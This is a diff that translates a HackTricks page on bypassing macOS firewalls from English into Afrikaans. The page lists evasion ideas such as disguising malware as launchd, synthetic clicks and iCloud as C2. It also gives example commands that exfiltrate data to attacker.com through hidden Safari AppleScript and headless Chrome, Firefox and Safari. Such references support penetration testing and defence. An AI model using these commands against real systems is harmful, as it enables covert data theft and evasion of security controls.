@@ -2,84 +2,74 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Found techniques
+## Gevonde tegnieke
 
-The following techniques were found working in some macOS firewall apps.
+Die volgende tegnieke is gevind wat werk in sommige macOS firewall toepassings.
 
-### Abusing whitelist names
+### Misbruik van witlys name
 
-- For example calling the malware with names of well known macOS processes like **`launchd`**
+- Byvoorbeeld om die malware te noem met name van bekende macOS prosesse soos **`launchd`**
 
-### Synthetic Click
+### Sintetiese Klik
 
-- If the firewall ask for permission to the user make the malware **click on allow**
+- As die firewall toestemming van die gebruiker vra, laat die malware **klik op toelaat**
 
-### **Use Apple signed binaries**
+### **Gebruik Apple geskrewe binaries**
 
-- Like **`curl`**, but also others like **`whois`**
+- Soos **`curl`**, maar ook ander soos **`whois`**
 
-### Well known apple domains
+### Bekende apple domeine
 
-The firewall could be allowing connections to well known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.
+Die firewall mag verbinding met bekende apple domeine soos **`apple.com`** of **`icloud.com`** toelaat. En iCloud kan as 'n C2 gebruik word.
 
-### Generic Bypass
+### Generiese Bypass
 
-Some ideas to try to bypass firewalls
+Sommige idees om te probeer om firewalls te omseil
 
-### Check allowed traffic
+### Kontroleer toegelate verkeer
 
-Knowing the allowed traffic will help you identify potentially whitelisted domains or which applications are allowed to access them
-
+Om die toegelate verkeer te ken, sal jou help om potensieel op die witlys geplaasde domeine of watter toepassings toegelaat word om toegang tot hulle te hê, te identifiseer.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
+### Misbruik van DNS
 
-### Abusing DNS
-
-DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.
+DNS-resolusies word gedoen via **`mdnsreponder`** onderteken toepassing wat waarskynlik toegelaat sal word om DNS-bedieners te kontak.
 
 <figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Via Browser apps
+### Deur Blaaier toepassings
 
 - **oascript**
-
 ```applescript
 tell application "Safari"
-    run
-    tell application "Finder" to set visible of process "Safari" to false
-    make new document
-    set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
+run
+tell application "Finder" to set visible of process "Safari" to false
+make new document
+set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
 end tell
 ```
-
 - Google Chrome
-
 ```bash
 "Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
 - Firefox
-
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
 - Safari
-
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
+### Deur prosesinjekties
 
-### Via processes injections
-
-If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:
+As jy **kode in 'n proses kan inspuit** wat toegelaat word om met enige bediener te verbind, kan jy die firewall beskerming omseil:
 
 {{#ref}}
 macos-proces-abuse/
 {{#endref}}
 
-## References
+## Verwysings
 
 - [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
